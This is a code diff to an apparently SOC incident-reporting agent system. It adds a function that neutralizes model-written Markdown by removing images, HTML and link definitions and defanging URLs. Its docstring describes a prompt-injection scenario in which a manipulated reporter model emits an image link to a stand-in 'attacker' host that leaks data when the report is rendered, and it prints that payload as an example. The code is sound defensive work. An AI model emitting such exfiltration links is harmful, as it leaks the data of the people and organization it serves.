@@ -91,6 +91,27 @@ def suggest_actions(
     return out[:9]
 
 
+_MD_IMAGE = re.compile(r"!\[([^\]]*)\]\s*[\(\[][^\)\]]*[\)\]]")
+_MD_LINK = re.compile(r"\[([^\]]*)\]\(([^)]*)\)")
+_MD_LINK_DEF = re.compile(r"^\s*\[[^\]]+\]:\s*\S+.*$", re.M)
+_HTML_TAG = re.compile(r"</?\s*[A-Za-z][^>]*>")
+_URL_SCHEME = re.compile(r"\b(h)(ttps?)(://)", re.I)
+
+
+def neutralize_markdown(text: str) -> str:
+    """Make model-written Markdown inert before anyone renders it.
+
+    A persuaded reporter could emit ``![x](https://attacker/?d=<data>)``: a Markdown viewer fetches the image and
+    leaks the data in the URL, with no click. Images, raw HTML and link definitions are removed, inline links are
+    flattened to text, and every URL is defanged (``hxxps://``), the usual SOC convention.
+    """
+    text = _MD_IMAGE.sub(lambda m: f"[imagem removida: {m.group(1)}]", text)
+    text = _MD_LINK_DEF.sub("", text)
+    text = _HTML_TAG.sub("", text)
+    text = _MD_LINK.sub(lambda m: f"{m.group(1)} ({m.group(2)})", text)
+    return _URL_SCHEME.sub(lambda m: f"{m.group(1)}xx{m.group(2)[2:]}{m.group(3)}", text)
+
+
 def render_report(body: str, inc: Incident) -> str:
     """Wrap the reporter's text with parts it cannot suppress: injection banner and the action list."""
     head = f"# Incidente {inc.incident_id}\n\n"
@@ -103,7 +124,7 @@ def render_report(body: str, inc: Incident) -> str:
     for a in inc.suggested_actions:
         lines.append(f"- `{a.id}` **{a.kind}** em `{a.target}` — {a.rationale_text} _(status: {a.status})_")
     lines += ["", "_Nenhuma ação foi executada por este sistema. Decisões: `soc-agents approve <incidente> <ação>`._"]
-    return head + body.strip() + "\n" + "\n".join(lines) + "\n"
+    return head + neutralize_markdown(body).strip() + "\n" + "\n".join(lines) + "\n"
 
 
 class Orchestrator:
